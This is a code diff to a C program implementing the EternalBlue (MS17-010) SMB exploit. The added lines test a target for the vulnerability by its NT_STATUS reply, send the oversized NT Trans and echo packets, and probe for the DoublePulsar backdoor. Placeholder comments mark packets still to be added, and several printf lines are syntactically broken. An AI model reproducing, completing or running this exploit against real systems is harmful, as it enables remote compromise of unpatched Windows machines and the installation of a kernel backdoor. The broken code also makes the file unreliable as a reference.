@@ -122,6 +122,7 @@ int main(int argc, char** argv)
     transNamedPipeRequest[33] = userid[1];
 
     //send transNamedPipe request with FID=0
+    //checks for MS17-010 vulnerability
     printf("sending transNamedPipeRequest!\n");
     ret = send(sock, (char*)transNamedPipeRequest, sizeof(transNamedPipeRequest) - 1, 0);
     if (ret <= 0)
@@ -131,12 +132,31 @@ int main(int argc, char** argv)
     }
     recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
-    //sent NT trans request
+    //compare the NT_STATUS response to 0xC0000205 ( STATUS_INSUFF_SERVER_RESOURCES)
+    if (recvbuff[9] == 0x05 && recvbuff[10] == 0x02 && recvbuff[11] == 0x00 && recvbuff[12] == 0xc0)
+    {
+        printf("Target is vulnerable...Game on!\n");
+    }
+    else
+    {
+        printf("Target is not vulnerable\n");
+        closesocket(sock);
+        WSACleanup();
+        ExitProcess(0);
+    }
+
+    //send huge NT trans request
+    printf("sending big NT Trans packet!\n");
+    ret = send(sock, (char*)NTTranspacket, sizeof(NTTranspacket) - 1, 0);
     
     // SEND MORE PACKETS HERE
     // SEND MORE PACKETS HERE
     // SEND MORE PACKETS HERE
-    // SEND MORE PACKETS HERE
+    
+    //send echo packet
+    printf("sending echo packet!\n");
+    ret = send(sock, (char*)Echopacket, sizeof(Echopacket) - 1, 0);
+    
     // SEND MORE PACKETS HERE
     // SEND MORE PACKETS HERE
     // SEND MORE PACKETS HERE
@@ -147,18 +167,16 @@ int main(int argc, char** argv)
         printf("EternalBlue overwrite was successful\n");
     }
     
-    // SEND MORE PACKETS HERE
-    // SEND MORE PACKETS HERE
-    // SEND MORE PACKETS HERE
-    // SEND MORE PACKETS HERE
-    // SEND MORE PACKETS HERE
-    // SEND MORE PACKETS HERE
-    // SEND MORE PACKETS HERE
+    // SEND MORE DOUBLPULSAR PACKETS HERE
+    // SEND MORE DOUBLPULSAR PACKETS HERE
+    // SEND MORE DOUBLPULSAR PACKETS HERE
+    // SEND MORE DOUBLPULSAR PACKETS HERE
 
     //Replace tree ID and user ID in trans2 session setup packet
     memcpy(trans2_session_setup + 0x20, (char*)&userid, 2);  //update userid
     memcpy(trans2_session_setup + 0x1c, (char*)&treeid, 2);  //update treeid
 
+    printf("[*] Pinging backdoor...\n");
     //send modified trans2 session request
     ret = send(sock, (char*)trans2_session_setup, sizeof(trans2_session_setup) - 1, 0);
     if (ret <= 0)
@@ -170,6 +188,7 @@ int main(int argc, char** argv)
     //if multiplex id = x51 or 81 then DoublePulsar is present
     if (recvbuff[34] == 0x51)
     {
+        printf("[*] Backdoor returned code!  10 - Success!\n");
         printf("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
         printf("=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
         printf('=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
